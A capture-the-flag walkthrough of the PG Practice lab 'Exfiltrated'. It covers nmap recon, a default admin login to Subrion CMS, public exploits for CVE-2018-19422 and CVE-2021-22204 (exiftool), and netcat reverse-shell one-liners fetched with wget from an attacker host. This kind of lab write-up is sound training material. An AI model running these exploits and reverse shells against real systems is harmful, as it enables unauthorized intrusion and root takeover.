# **Exfiltrated | PG Practice**

***
## Attack and exfiltrate the target!

## Author: Enox
## Released on: Sep 06, 2021
## Walkthrough: Yes
***


## **Scanning**


Running our network mapper (nmap) for open ports//services//version discovery we have

```bash
# Nmap 7.94SVN scan initiated Wed Feb 28 08:49:14 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.227.163
Warning: 192.168.227.163 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.227.163
Host is up (0.14s latency).
Not shown: 65204 closed tcp ports (conn-refused), 329 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 28 08:50:57 2024 -- 1 IP address (1 host up) scanned in 103.63 seconds
```


## **Reconnaissance**

Pasting the IP into the search bar on our browser we are referred to [http://exfiltrated.offsec/](http://exfiltrated.offsec/)


![](https://i.imgur.com/XUnVPE1.png)


We can add this to our `/etc/hosts` file which **matches the FQDN with the server IP Address in the domain**


![](https://i.imgur.com/ZkYbRNf.png)


Refreshing the page on our browser we have a CMS called "**Subrion**"


![](https://i.imgur.com/nf5tsHX.png)


having our nmap scan told us we have "**7 disallowed entries**" in `/robots.txt` so let check that first before attempting anything further


![](https://i.imgur.com/8RflEKg.png)


Checking `/backup` we have a 404 page

![](https://i.imgur.com/jAx9Fbu.png)


We have a blank page on `/cron/?`


![](https://i.imgur.com/ALlT0H3.png)

`/front/` -->

![](https://i.imgur.com/x0rncFJ.png)

`/install/` -->

![](https://i.imgur.com/w2IS8VY.png)

`/tmp/` -->

![](https://i.imgur.com/a76pR6M.png)

`/updates/` -->

![](https://i.imgur.com/u7Dzhuz.png)


However under `/panel/` we have an Admin login portal for the **Subrion** CMS



![](https://i.imgur.com/8bcDW6O.png)


Trying out the following `admin:admin` credential i was able to login to the Admin panel


![](https://i.imgur.com/ZmDDaRu.png)


## **FootHold**


After navigating through the web app, i was not able to find something through the web application to give us foothold so decided to enumerate for the version **"Subrion 4.2"** and found an Authenticated Remote Code Execution via File Upload, You can download the exploit from [here](https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE) and run as shown below.


```bash
❯ git clone https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE.git
❯ cd CVE-2018-19422-SubrionCMS-RCE
❯ python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p *****
```



![](https://i.imgur.com/MgT80q6.png)


Since this is not a stable shell, but a PHP web shell that gave us RCE, we need to get a stable shell by uploading our own reverse shell payload into the machine, Go ahead and save the following into a file called `shell.sh`


```bash
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.209 1234 >/tmp/f
```


Now transfer the file to the web shell we got earlier as user `www-data` from your local machine to the `/tmp` directory of the target machine as this directory is always world writable on CTFs

```bash
# Attacker-Machine
python3 -m http.server 80

# Target-Machine
wget 192.168.45.209/shell.sh -O /tmp/shell.sh
```




![](https://i.imgur.com/FvUvFJc.png)


Once this is done, we can then gain a reverse shell by starting up a listener and executing the `shell.sh` on our target system, then stabilize our shell


```bash
# Attacker-Machine
nc -lvnp 1234

# Target-Machine
bash /tmp/shell.sh

# Stabilize Reverse Shell
script -qc /bin/bash
[Ctrl+z] # Suspend process
stty raw -echo; fg
export TERM=xterm-256color
```


![](https://i.imgur.com/z4Ydevv.png)

## **Privilege Escalation**

However i uploaded `linpeas.sh` cos' we have a user called `coaran` in the `/home` directory, my major reason for doing this is to automate the process of finding credentials for this user or even the `root` user as `linpeas.sh` has this feature.

![](https://i.imgur.com/uAl2X5k.png)


I did not find any important information with `linpeas.sh` but checking crontab we have this `/opt/image-exif.sh` running as a cronjob with the user `root`

![](https://i.imgur.com/q1D3ijB.png)

Decided to upload check the content of this file and also see if it was writable, but it wasn't 🥲


![3Uc5VJy.png](https://i.imgur.com/3Uc5VJy.png)

### **Let Analyze**

1. The script starts by printing a message indicating that the metadata directory has been cleaned.
    
2. It defines two variables:
    
    - `IMAGES`: The directory where JPG images are located.
    - `META`: The directory where the metadata will be stored
    
3. It generates a random filename using `openssl rand -hex 5` and assigns it to the variable `FILE`.
    
4. It constructs the path to the logfile using the `$META` directory and the random filename generated earlier.
    
5. Another message is printed indicating that the script is about to process EXIF metadata.
    
6. The script lists files in the `$IMAGES` directory with the `jpg` extension and pipes the output to `grep` to filter out only JPEG files. Then, it loops through each filename.
    
7. Within the loop, it uses `exiftool` to extract EXIF metadata from each JPEG image and appends the output to the logfile specified by `$LOGFILE`.
    
8. Once all files have been processed, a final message is printed indicating that the processing is finished.

```bash
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"

```

![](https://i.imgur.com/etVRZMc.png)


Well, the vulnerability exists in step 7 where the `exiftool` version is vulnerable to an Arbitrary code execution due to Improper neutralization of user data in the `DjVu` file format, Known as `CVE-2021-22204`. You can download the exploit from [here](https://github.com/UNICORDev/exploit-CVE-2021-22204)


![](https://i.imgur.com/C2VBn3A.png)


Then create your reverse shell payload with it, although it is important you understand what each steps is doing, this tool does it directly for you, however if you want to learn how this is been created, refer to this [article](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/)


```bash
python3 exploit-CVE-2021-22204.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.209 1337 >/tmp/f'
```



![](https://i.imgur.com/5ib5oWx.png)


Then on the target machine change directory to `IMAGES` variable created in the script and transfer the `imaje.jpg` file there


```bash
# Attacker-Machine
python3 -m http.server 80

# Target-Machine
cd /var/www/html/subrion/uploads
wget 192.168.45.209/image.jpg
```



![](https://i.imgur.com/fUV0T2b.png)


Real quick 🥶, Start up your listener and you should get a shell as user `root`


```bash
nc -lvnp 1337
```


![](https://i.imgur.com/J8cFhaR.png)


GG 😄

![](https://i.pinimg.com/originals/22/cc/d4/22ccd4b0bc4acb55cebb131cc9bd0d09.gif)


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>


